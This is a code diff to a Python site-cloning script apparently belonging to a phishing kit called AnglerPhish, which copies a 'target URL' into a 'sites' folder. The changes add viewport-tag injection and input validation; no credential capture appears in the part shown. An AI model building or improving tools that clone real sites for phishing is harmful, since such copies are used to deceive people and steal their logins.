@@ -1,4 +1,5 @@
 import os
+import sys
 import requests
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin, urlparse
@@ -14,9 +15,9 @@ def print_banner():
  / ___ \| | | | (_| | |  __/ |  |  __/| | | | \__ \ | | |
 /_/   \_\_| |_|\__, |_|\___|_|  |_|   |_| |_|_|___/_| |_|
                |___/   
-    """, "cyan", attrs=["bold"]))
-    print(colored("  AnglerPhish Cloning Engine", "green", attrs=["bold"]))
-    print(colored("  developer: zerosocialcode\n", "white"))
+""", "cyan", attrs=["bold"]))
+    print(colored("AnglerPhish Cloning Engine", "green", attrs=["bold"]))
+    print(colored("developer: zerosocialcode\n", "white"))
 
 def prompt(text):
     return input(colored(text, "cyan", attrs=["bold"]))
@@ -51,10 +52,14 @@ class Cloner:
             print_info(f"[*] Cloning: {url}")
 
             if self._try_wget_clone(url, output_dir):
+                self._inject_viewport_meta(output_dir)
                 print_success(f"[+] Successfully cloned to: {output_dir}")
                 return True
 
-            return self._python_clone_with_resources(url, output_dir)
+            if self._python_clone_with_resources(url, output_dir):
+                self._inject_viewport_meta(output_dir)
+                return True
+            return False
 
         except Exception as e:
             print_error(f"[!] Error: {str(e)}")
@@ -124,17 +129,74 @@ class Cloner:
         except requests.RequestException as e:
             print_error(f"[!] Failed to download: {resource_url} ({e})")
 
-def main():
-    print_banner()
-    url = prompt("\nEnter target URL: ").strip()
-    folder_name = prompt("Enter folder name (will be created in AnglerPhish/sites/): ").strip()
+    def _inject_viewport_meta(self, output_dir):
+        """Injects responsive viewport meta tag into all HTML files"""
+        for root, _, files in os.walk(output_dir):
+            for file in files:
+                if file.lower().endswith(('.html', '.htm')):
+                    file_path = os.path.join(root, file)
+                    try:
+                        with open(file_path, 'r+', encoding='utf-8') as f:
+                            content = f.read()
+                            soup = BeautifulSoup(content, 'html.parser')
+                            
+                            # Check for existing viewport tag
+                            viewport = soup.find('meta', attrs={'name': 'viewport'})
+                            
+                            if not viewport:
+                                # Create new viewport tag if none exists
+                                viewport = soup.new_tag('meta')
+                                viewport.attrs['name'] = 'viewport'
+                                viewport.attrs['content'] = 'width=device-width, initial-scale=1.0'
+                                
+                                # Insert into head or create head if missing
+                                head = soup.head
+                                if not head:
+                                    head = soup.new_tag('head')
+                                    if soup.html:
+                                        soup.html.insert(0, head)
+                                    else:
+                                        soup.insert(0, head)
+                                
+                                head.insert(0, viewport)
+                                
+                                # Save changes
+                                f.seek(0)
+                                f.write(str(soup))
+                                f.truncate()
+                                print_success(f"[+] Added viewport meta to: {file_path}")
+                            else:
+                                print_info(f"[*] Viewport meta already exists in: {file_path}")
+                    except Exception as e:
+                        print_error(f"[!] Failed to inject viewport in {file_path}: {str(e)}")
 
-    cloner = Cloner()
-    if cloner.clone_site(url, folder_name):
-        final_path = os.path.join(cloner.base_dir, folder_name)
-        print_success(f"\n[+] Clone successful! Saved to: {final_path}")
-    else:
-        print_error("\n[!] Cloning failed")
+def main():
+    try:
+        print_banner()
+        url = prompt("\nEnter target URL: ").strip()
+        if not url:
+            print_error("\n[!] URL cannot be empty")
+            sys.exit(1)
+            
+        folder_name = prompt("Enter folder name (will be created in AnglerPhish/sites/): ").strip()
+        if not folder_name:
+            print_error("\n[!] Folder name cannot be empty")
+            sys.exit(1)
+
+        cloner = Cloner()
+        if cloner.clone_site(url, folder_name):
+            final_path = os.path.join(cloner.base_dir, folder_name)
+            print_success(f"\n[+] Clone successful! Saved to: {final_path}")
+        else:
+            print_error("\n[!] Cloning failed")
+            
+    except KeyboardInterrupt:
+        print_error("\n\n[!] Operation cancelled by user")
+        sys.exit(1)
+        
+    except Exception as e:
+        print_error(f"\n[!] Unexpected error: {str(e)}")
+        sys.exit(1)
 
 if __name__ == "__main__":
     main()
